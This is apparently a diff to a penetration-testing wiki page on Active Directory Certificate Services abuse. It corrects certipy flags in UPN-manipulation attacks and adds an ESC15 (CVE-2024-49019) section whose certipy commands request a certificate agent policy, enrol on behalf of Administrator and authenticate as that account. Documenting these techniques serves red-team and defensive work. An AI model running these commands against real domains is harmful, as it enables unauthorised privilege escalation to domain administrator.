@@ -282,7 +282,7 @@ certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn
 The vulnerable certificate can be requested as user2.
 
 ```bash
-certipy req -username "user2@$DOMAIN" -hash "$NT_HASH" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template'
+certipy req -username "user2@$DOMAIN" -hashes "$NT_HASH" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template'
 ```
 
 The user2's UPN is changed back to something else.
@@ -351,6 +351,7 @@ To understand this privilege escalation, it is recommended to know how certifica
 This ESC refers to a weak configuration of the registry keys:
 
 #### Case 1
+
  * `StrongCertificateBindingEnforcement` set to `0`, meaning no strong mapping is performed
  * A template that specifiy client authentication is enabled (any template, like the built-in `User` template)
  * `GenericWrite` right against any account A to compromise any account B
@@ -381,7 +382,7 @@ certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn
 A certificate permitting client authentication can be requested as user2.
 
 ```bash
-certipy req -username "user2@$DOMAIN" -hash "$NT_HASH" -ca 'ca_name' -template 'User'
+certipy req -username "user2@$DOMAIN" -hashes "$NT_HASH" -ca 'ca_name' -template 'User'
 ```
 
 The user2's UPN is changed back to something else.
@@ -446,6 +447,7 @@ Rubeus.exe asktgt /getcredentials /certificate:"BASE64_CERTIFICATE" /password:"C
 :::
 
 #### Case 2
+
  * `CertificateMappingMethods` is set to `0x4`, meaning no strong mapping is performed and only the UPN will be checked
  * A template that specifiy client authentication is enabled (any template, like the built-in `User` template)
  * `GenericWrite` right against any account A to compromise any account B without a UPN already set (machine accounts or buit-in Administrator account for example)
@@ -476,7 +478,7 @@ certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn
 A certificate permitting client authentication can be requested as user2.
 
 ```bash
-certipy req -username "user2@$DOMAIN" -hash "$NT_HASH" -ca 'ca_name' -template 'User'
+certipy req -username "user2@$DOMAIN" -hashes "$NT_HASH" -ca 'ca_name' -template 'User'
 ```
 
 The user2's UPN is changed back to something else.
@@ -860,6 +862,42 @@ The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-th
 
 :::
 
+### (ESC15 - CVE-2024-49019) Arbitrary application policy
+
+> [!NOTE] NOTE
+> This privilege escalation has been marked as [CVE-2024-49019](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019) by Microsoft, and will therefore no longer be exploitable on patched systems.
+
+By default, the X509 standard uses EKUs to indicate the possible uses of a certificate. Under Windows, a field called `Application Policy` is added to certificates, and this does the same thing as EKUs, but with a few more options. If both EKUs and *application policies* are present in a certificate, the latter takes precedence.
+
+It turns out that if a certificate template uses **version 1** of the certificate templates, authorises the SAN specification, and if it is possible to enrol on it, then it is possible to request a certificate by specifying an arbitrary user and requesting an arbitrary *application policy*.
+
+> [!TIP] TIP
+> Note, however, that specifying "Client Authentication" in *application policy* will only allow **SChannel authentication and not PKINIT**. On the other hand, by specifying "Certificate Request Agent" (`1.3.6.1.4.1.311.20.2.1`), the certificate can be used as an [ESC3](certificate-templates.md#certificate-agent-eku-esc3).
+
+You can see the ESC15 as an [ESC2](certificate-templates.md#any-purpose-eku-esc2) with more steps.
+
+::: tabs
+
+=== UNIX-like
+
+From UNIX-like systems, [this pull request on Certipy](https://github.com/ly4k/Certipy/pull/228) (Python) can be used to enumerate for, and conduct, the ESC15 scenario. 
+
+```bash
+# Request a certificate with "Certificate Request Agent" application policy
+certipy req -u $USER@$DOMAIN --application-policies "1.3.6.1.4.1.311.20.2.1" -ca $CA_NAME -template $TEMPLATE -dc-ip $DC_IP
+
+# Use the certificate in a ESC3 scenario to ask for a new certificate on behalf of another user
+certipy req -u $USER@$DOMAIN -on-behalf-of $DOMAIN\\Administrator -template User -ca $CA_NAME -pfx cert.pfx -dc-ip $DC_IP
+
+# Authenticate with the last certificate
+certipy auth -pfx administrator.pfx -dc-ip $DC_ADDR
+```
+
+=== Windows
+
+_At the time of writing, no solution exists to perform this attack from a Windows machine._
+
+:::
 
 ## Resources
 
@@ -872,3 +910,5 @@ The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-th
 [https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)
 
 [https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9)
+
+[https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
